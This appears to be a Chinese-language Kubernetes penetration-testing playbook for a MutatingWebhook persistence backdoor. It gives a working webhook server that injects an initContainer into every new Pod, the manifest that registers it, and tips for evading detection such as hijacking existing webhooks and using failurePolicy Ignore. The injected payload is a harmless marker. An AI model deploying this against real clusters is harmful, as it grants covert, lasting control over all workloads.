---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-7.4]
mapped_compliance_families: [Webhook配置, 准入控制]
---

# mutating-webhook-persist — MutatingWebhook 持久化后门

攻击者利用 `mutatingwebhookconfigurations/create` 权限或现有 MutatingWebhook 配置，注入恶意 Webhook 将所有新建 Pod 自动注入恶意容器/环境变量/ServiceAccount Token，实现持久化控制与隐蔽横向移动。

---

## 1. 前置条件

- 当前身份被授予 `mutatingwebhookconfigurations/create` 权限（kubectl auth can-i create mutatingwebhookconfigurations）
- 已有可控的 HTTPS 服务作为 webhook endpoint 接收 admission 请求
- 集群未限制 MutatingWebhook 创建（无 OPA Gatekeeper/Kyverno 等约束）
- 或现有 MutatingWebhook 配置指向可篡改的服务

检查命令：
```bash
# [L0] 检查是否可创建 MutatingWebhookConfiguration
kubectl auth can-i create mutatingwebhookconfigurations
# 期望输出: yes

# [L0] 列出现有 MutatingWebhook 配置
kubectl get mutatingwebhookconfiguration
# 期望输出: 现有 webhook 配置列表
```

## 2. 探测命令

```bash
# [L0] 验证创建权限
kubectl auth can-i create mutatingwebhookconfigurations.admissionregistration.k8s.io
# 期望输出: yes

# [L0] 列出现有 MutatingWebhook 详情
kubectl get mutatingwebhookconfiguration -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.webhooks[*].clientConfig.service}{"\n"}{end}'
# 期望输出: 现有 webhook 及其指向服务

# [L0] 检查是否已存在可疑 webhook 配置
kubectl get mutatingwebhookconfiguration -o yaml | grep -E 'failureMode:|namespaceSelector:|sideEffects:'
# 期望输出: 显示 webhook 服务匹配规模（若 .*.* = 全部 namespace → 风险高）

# [L1] 检查 webhook 后端服务是否可达
kubectl get svc -A | grep webhook
# 期望输出: 现有 webhook 服务 endpoint

# [L0] 检查准入控制器日志（启用审计日志）
grep -r 'webhook.*admission' /var/log/audit/ 2>/dev/null | head -5
# 期望输出: 显示 admission 请求记录
```

## 3. 攻击验证

```bash
# [L2] 攻击准备：起一个 webhook 后端（Python)
cat > /tmp/webhook-poc.py <<'PYEOF'
import http.server, ssl, json, base64

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers.get('Content-Length', 0))
        self.rfile.read(l)
        # 注入一个 initContainer
        patch = [{
            "op": "add",
            "path": "/spec/initContainers/-",
            "value": {"name": "poc-injected", "image": "busybox",
                      "args": ["sh", "-c", "touch /tmp/webhook-poc-marker; sleep 1"]}
        }]
        resp = {
            "apiVersion": "admission.k8s.io/v1",
            "kind": "AdmissionReview",
            "response": {"allowed": True, "patchType": "JSONPatch",
                         "patch": base64.b64encode(json.dumps(patch).encode()).decode()}
        }
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(resp).encode())

httpd = http.server.HTTPServer(("0.0.0.0", 4443), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
# 用自签证书或集群 CA 签发的服务证书
ctx.load_cert_chain("/tmp/webhook-cert.pem", "/tmp/webhook-key.pem")
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
PYEOF

# 在节点上启动 webhook 后端（后台运行）
python3 /tmp/webhook-poc.py &

# [L2] 创建 webhook 服务
kubectl create svc clusterip webhook-poc --tcp=4443 -o yaml --dry-run=client > /tmp/webhook-svc.yaml
echo "---" >> /tmp/webhook-svc.yaml
kubectl apply -f /tmp/webhook-svc.yaml

# [L2] 提交恶意 MutatingWebhookConfiguration
cat > /tmp/malicious-webhook.yaml <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: poc-webhook
webhooks:
- name: poc-webhook.default.svc
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore
  rules:
  - apiVersions: ["v1"]
    apiGroups: [""]
    resources: ["pods"]
    operations: ["CREATE"]
    scope: Namespaced
  clientConfig:
    service:
      name: webhook-poc
      namespace: default
      path: "/"
      port: 4443
EOF

kubectl apply -f /tmp/malicious-webhook.yaml
# 期望输出: mutatingwebhookconfiguration.admissionregistration.k8s.io/poc-webhook created

# [L2] 触发：创建一个普通 Pod
kubectl run victim-pod --image=nginx -o yaml --dry-run=client | kubectl apply -f -
# 期望输出: pod/victim-pod created

# [L2] 攻击后验证：新 Pod 被注入 initContainer
kubectl get pod victim-pod -o jsonpath='{.spec.initContainers[*].name}'
# 期望输出: poc-injected（说明 webhook 注入成功）

# [L2] 验证标记文件
# 注意：根据 webhook 逻辑，marker 是在容器内写入 /tmp/webhook-poc-marker（这个 pod 内）

# [L2] 清理
kubectl delete pod victim-pod
kubectl delete mutatingwebhookconfiguration poc-webhook
kubectl delete svc webhook-poc
rm /tmp/malicious-webhook.yaml /tmp/webhook-poc.py
# 期望输出: 无报错
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：MutatingWebhook 列表
kubectl get mutatingwebhookconfiguration --no-headers | wc -l
# 期望输出: 攻击前数量 N

# [L0] 攻击后环境对比：MutatingWebhook 新增
kubectl get mutatingwebhookconfiguration --no-headers | wc -l
# 期望输出: N+1（新增 poc-webhook）

# [L2] 攻击前：新 Pod 不含 initContainer
kubectl run baseline-pod --image=nginx
kubectl get pod baseline-pod -o jsonpath='{.spec.initContainers[*].name}' 2>&1
# 期望输出: 无输出（无 initContainer）

# [L2] 攻击后：通过恶意 webhook 后，新 Pod 含注入的 initContainer
kubectl run victim-pod --image=nginx
kubectl get pod victim-pod -o jsonpath='{.spec.initContainers[*].name}'
# 期望输出: poc-injected → 证明 webhook 持久化注入成功

# [L0] 清理后：列表数量恢复
kubectl get mutatingwebhookconfiguration --no-headers | wc -l
# 期望输出: N
```

差分结论：攻击前普通 Pod 无注入痕迹，攻击后 MutatingWebhookConfiguration 篡改使新建 Pod 自动注入恶意 initContainer，证明 MutatingWebhook 持久化后门成功。

## 5. 绕过策略

```bash
# [L1] 检查是否限制 MutatingWebhook 创建（OPA Gatekeeper/Kyverno 约束）
kubectl get constrainttemplate 2>/dev/null
# 若存在限制 webhook 创建的约束 → 攻击拦截

# [L0] 检查 PodSecurity Standards restricted 是否阻塞 initContainer
kubectl get validatingadmissionpolicy 2>/dev/null
# 若存在限制乐观镜像/挂载策略 → 注入或被拒绝

# 绕过方式：
# - [L2] 篡改现有合法 Webhook 配置而非新建（修改 clientConfig.service 指向攻击者服务），减少配置数量增加带来的可见性
# - [L2] 注入逻辑使用 namespaceSelector 限定某命名空间，绕过集中告警机制
# - [L1] 注入只对 Pod 创建生效，可注入 initContainer 而 env 变量绕过 hostPath 检测
# - [L2] 若 webhook endpoint 需 TLS 证书且集群 CA 已被信任，使用合法证书避免运维告警
# - [L2] 若 cluster 已启用 audit log，将 webhook 设为 failurePolicy: Ignore 时即使后端不可达也允许请求，掩盖行为
```

## 6. 证伪条件

```bash
# [L0] 无 MutatingWebhookConfiguration 创建权限
kubectl auth can-i create mutatingwebhookconfigurations
# 输出: no → 证伪

# [L0] 无现有 MutatingWebhook 配置可篡改
kubectl get mutatingwebhookconfiguration
# 输出: No resources found → 证伪（攻击前提不存在）

# [L0] 集群 admission 拦截 webhook 创建（OPA Gatekeeper）
kubectl apply -f malicious-webhook.yaml 2>&1
# 输出: admission webhook "validation.gatekeeper.sh" denied the request → 证伪

# [L2] 创建后 Pod 无注入痕迹
kubectl get pod victim-pod -o jsonpath='{.spec.initContainers[*].name}'
# 输出: 无输出 → 证伪

# [L1] Webhook endpoint 不可达
kubectl exec -n <ns> <pod> -- sh -c 'curl -s -o /dev/null -w "%{http_code}" http://webhook-poc.default.svc:4443/'
# 输出: 000/000 → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（创建 webhook 后端、提交 MutatingWebhook、创建验证 Pod）→ **Level 4**（修改准入控制，需人工确认）
- **L1** 探测现有 webhook（kubectl get/service）→ **Level 2**（只读探测，自动执行）
- **L0** 权限与配置观察（auth can-i、列表）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否（攻击验证后清理所有注入资源）
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Persistence
- **Technique ID**: T1610
- **Technique Name**: Deploy Container（广义：通过准入控制面持久化）
- **描述**: 攻击者通过创建恶意 MutatingWebhookConfiguration，使集群未来每个新建 Pod 都被自动注入恶意 initContainer/环境变量/挂载点，实现无需再次进入集群即可自动控制的持久化后门，对 K8s 准入控制面的滥用长期潜伏。